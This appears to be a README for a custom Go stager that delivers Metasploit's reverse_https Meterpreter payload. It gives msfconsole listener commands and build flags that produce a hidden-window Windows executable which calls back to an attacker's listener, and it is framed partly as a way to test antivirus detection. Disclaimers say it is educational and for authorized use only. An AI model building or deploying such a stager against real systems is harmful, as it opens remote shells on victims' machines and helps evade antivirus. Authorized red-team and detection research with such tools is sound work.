**!!! This is for educational purposes only !!!** <br> **!!! Use this only where authorized !!!**

This is a custom stager written for Metasploit Framework's reverse_https meterpreter payload. I wrote this to get a better understanding of Metasploit Framework's payloads and how well antiviruses detect custom stagers.

# Launching a listener
Using the included `.rc` file launch msfconsole i.e. `msfconsole -f ./listener.rc`

Or run at least the following commands in msfconsole substituting your listening address and port number:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lport ENTERPORTNUMBERHERE
set lhost ENTERLISTENADDRESSHERE
run
```

# Compiling the payload
**Ensure you have changed the host and port variables in the msf_rev_https.go file.**

The following examples assume you have a shell open in the directory of the msf_rev_https.go file.

These will result in a `.exe` file that will call back to your msfconsole listener.
### Windows
    go build -trimpath -ldflags "-H=windowsgui -w -s" -o newExecutable.exe . 
### Linux
    env GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w -H=windowsgui" -o newExecutable.exe .
